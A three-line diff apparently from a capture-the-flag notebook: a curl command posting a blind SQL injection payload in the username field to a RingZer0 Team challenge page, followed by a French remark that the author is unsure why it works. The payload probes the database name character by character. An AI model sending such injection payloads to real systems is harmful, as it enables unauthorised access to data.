@@ -1,0 +1,3 @@
+paul@Claranet:~$ curl -s --cookie "PHPSESSID=3j57kgmq4j9n5ands7dhhh6d93"  -XPOST  --data-urlencode "username=' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '%a%') AND ''='" https://ringzer0team.com/challenges/2 > ble.html
+
+Je suis pas sur de pourquoi ça marche mais ça marche lol
